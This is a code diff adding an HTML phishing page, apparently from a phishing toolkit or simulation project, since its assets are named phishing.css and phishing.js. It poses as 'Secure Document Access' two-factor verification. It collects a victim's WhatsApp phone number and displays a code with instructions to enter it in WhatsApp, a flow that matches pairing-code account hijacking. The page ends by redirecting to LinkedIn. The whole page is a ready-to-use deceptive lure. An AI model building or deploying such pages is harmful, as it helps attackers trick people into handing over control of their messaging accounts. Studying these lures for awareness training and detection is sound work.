@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Access</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E📄%3C/text%3E%3C/svg%3E">
+    <link rel="stylesheet" href="/static/css/phishing.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="brand-icon">🔒</div>
+            <h1 data-i18n="title">Secure Document Access</h1>
+            <div class="subtitle" data-i18n="subtitle">Identity verification required</div>
+        </div>
+
+        <div class="card">
+            <!-- Step 1: Phone Number Entry -->
+            <div id="step1" class="step active">
+                <div class="info-box" style="margin-top: 0;">
+                    <h4 data-i18n="step1.title">Two-Factor Authentication Required</h4>
+                    <p data-i18n="step1.description">
+                        To access this secure document, identity verification via WhatsApp
+                        is required. This ensures only authorized recipients can view its contents.
+                    </p>
+                </div>
+
+                <div class="highlight-box">
+                    <p>
+                        <strong data-i18n="step1.why_title">Why verification?</strong><br>
+                        <span style="display: block; margin-top: 8px;" data-i18n="step1.why_description">
+                        This security measure protects sensitive documents from unauthorized
+                        access and ensures regulatory compliance. The process completes in
+                        under 60 seconds.
+                        </span>
+                    </p>
+                </div>
+
+                <div style="margin-bottom: 18px;">
+                    <label for="phone" data-i18n="step1.phone_label">WhatsApp phone number</label>
+                    <div class="phone-input-group">
+                        <select class="country-select" id="countryCode">
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+39">🇮🇹 +39</option>
+                            <option value="+34">🇪🇸 +34</option>
+                            <option value="+31">🇳🇱 +31</option>
+                            <option value="+41">🇨🇭 +41</option>
+                            <option value="+43">🇦🇹 +43</option>
+                            <option value="+32">🇧🇪 +32</option>
+                            <option value="+46">🇸🇪 +46</option>
+                            <option value="+47">🇳🇴 +47</option>
+                            <option value="+45">🇩🇰 +45</option>
+                            <option value="+358">🇫🇮 +358</option>
+                            <option value="+48">🇵🇱 +48</option>
+                            <option value="+351">🇵🇹 +351</option>
+                            <option value="+7">🇷🇺 +7</option>
+                            <option value="+380">🇺🇦 +380</option>
+                            <option value="+90">🇹🇷 +90</option>
+                            <option value="+91">🇮🇳 +91</option>
+                            <option value="+86">🇨🇳 +86</option>
+                            <option value="+81">🇯🇵 +81</option>
+                            <option value="+82">🇰🇷 +82</option>
+                            <option value="+61">🇦🇺 +61</option>
+                            <option value="+55">🇧🇷 +55</option>
+                            <option value="+52">🇲🇽 +52</option>
+                            <option value="+54">🇦🇷 +54</option>
+                            <option value="+971">🇦🇪 +971</option>
+                            <option value="+966">🇸🇦 +966</option>
+                            <option value="+20">🇪🇬 +20</option>
+                            <option value="+27">🇿🇦 +27</option>
+                            <option value="+234">🇳🇬 +234</option>
+                            <option value="+254">🇰🇪 +254</option>
+                            <option value="+65">🇸🇬 +65</option>
+                            <option value="+60">🇲🇾 +60</option>
+                            <option value="+63">🇵🇭 +63</option>
+                            <option value="+84">🇻🇳 +84</option>
+                            <option value="+66">🇹🇭 +66</option>
+                        </select>
+                        <input type="tel" id="phone" placeholder="123 456 7890" maxlength="15" autocomplete="off" required>
+                    </div>
+                </div>
+
+                <button class="btn" onclick="startVerification()" id="startBtn" data-i18n="step1.button">
+                    Verify Identity
+                </button>
+
+                <div class="footer-text">
+                    <p data-i18n="step1.footer">
+                        By continuing, you confirm you are authorized to access this document.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Step 2: Processing -->
+            <div id="step2" class="step">
+                <div class="info-box">
+                    <h4 data-i18n="step2.title">Verification in Progress</h4>
+                    <p data-i18n="step2.description">
+                        Establishing secure connection and generating your verification code.
+                        Please wait briefly.
+                    </p>
+                </div>
+
+                <div class="loading-container">
+                    <div class="loader"></div>
+                </div>
+
+                <p style="text-align: center; color: #555; font-size: 14px; margin-top: 12px;" data-i18n="step2.status">
+                    Connecting to verification system...
+                </p>
+            </div>
+
+            <!-- Step 3: Code Display -->
+            <div id="step3" class="step">
+                <div class="info-box success-box">
+                    <h4 data-i18n="step3.title">Verification Code Ready</h4>
+                    <p data-i18n="step3.description">
+                        A unique verification code has been generated for your session.
+                        Enter it on your mobile device to complete authentication.
+                    </p>
+                </div>
+
+                <p style="margin: 22px 0 12px 0; font-size: 14px; color: #555; font-weight: 500; text-align: center;" data-i18n="step3.code_label">
+                    Enter this code on your phone:
+                </p>
+
+                <div class="code-display" id="displayedCodeBox">XXXX-XXXX</div>
+
+                <div class="info-box">
+                    <h4 data-i18n="step3.instructions_title">Steps to complete:</h4>
+                    <ol data-i18n-list="step3.instructions">
+                        <li>Open WhatsApp on your phone</li>
+                        <li>A verification request will appear</li>
+                        <li>Enter the code shown above: <strong id="displayedCodeText" style="color: #0a66c2;">XXXX-XXXX</strong></li>
+                        <li>Wait for confirmation</li>
+                    </ol>
+                </div>
+
+                <p style="margin-top: 18px; font-size: 13px; color: #888; text-align: center;">
+                    <span data-i18n="step3.verifying">Verifying:</span>
+                    <span id="phoneDisplay2" style="color: #555; font-weight: 500;"></span>
+                </p>
+
+                <button class="btn btn-secondary" onclick="goBack()">
+                    <span data-i18n="step3.cancel">Cancel Verification</span>
+                </button>
+            </div>
+
+            <!-- Step 5: Success -->
+            <div id="step5" class="step">
+                <div class="success-badge">
+                    <div class="check-icon">✓</div>
+                    <h3 data-i18n="step5.success_title">Authentication Successful</h3>
+                    <p data-i18n="step5.success_description">
+                        Thank you for completing verification. Redirecting you to the document.
+                    </p>
+                </div>
+
+                <div class="loading-container">
+                    <div class="loader" style="border-color: #a7f3d0; border-top-color: #065f46;"></div>
+                </div>
+
+                <p style="color: #555; font-size: 15px; font-weight: 500; text-align: center;" data-i18n="step5.redirecting">
+                    Redirecting to document...
+                </p>
+
+                <div class="footer-text" style="text-align: center;">
+                    <p>
+                        <span data-i18n="step5.manual_redirect">If not redirected,</span>
+                        <a href="https://www.linkedin.com" data-i18n="step5.click_here">click here</a>.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/js/i18n.js"></script>
+    <script src="/static/js/phishing.js"></script>
+</body>
+</html>
